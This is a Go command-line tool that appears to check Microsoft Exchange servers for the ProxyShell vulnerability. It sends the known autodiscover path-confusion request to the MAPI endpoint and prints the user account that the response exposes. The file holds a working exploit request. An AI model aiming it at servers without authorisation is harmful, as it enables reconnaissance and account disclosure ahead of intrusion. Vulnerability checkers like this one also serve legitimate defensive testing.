package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

func check(target string) {
	user_agent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
	/*构造payload*/
	cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}

	request, err := http.NewRequest(http.MethodGet, target+"/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com", nil)
	if err != nil {
		fmt.Println(err)
	}

	request.Header.Add("User-Agent", user_agent)
	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	request.Header.Add("Connection", "close")

	do, err := cli.Do(request)
	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	defer func() {
		_ = do.Body.Close()
	}()

	ioread, _ := ioutil.ReadAll(do.Body)
	bannerstr := Between(string(ioread), `<title>`, `</title>`)
	targetuser := Between(string(ioread), `<b>User:</b> `, `<br><b>UPN:</b>`)

	if do.StatusCode == 200 && bannerstr == "Exchange MAPI/HTTP Connectivity Endpoint" {
		fmt.Println(do.Status)
		fmt.Println("[+] target user is : " + targetuser)
		fmt.Println("[+] target is vulnerable to proxyshell !")
	} else if bannerstr == "Exchange MAPI/HTTP Connectivity Endpoint" {
		fmt.Println("[-] target is not vulnerable to proxyshell !")
	}
}

func main() {
	var target string
	flag.StringVar(&target, "u", "", "")
	flag.CommandLine.Usage = func() {
		fmt.Println("usage：\nexec: ./chkproxyshell -u <target url>")
	}
	flag.Parse()
	if len(target) == 0 {
		fmt.Println("[+] please enter the url you want to check!!!")
		fmt.Println("[+] Author: https://github.com/FDlucifer, https://twitter.com/fdlucifer11")
	} else {
		check(target)
	}
}
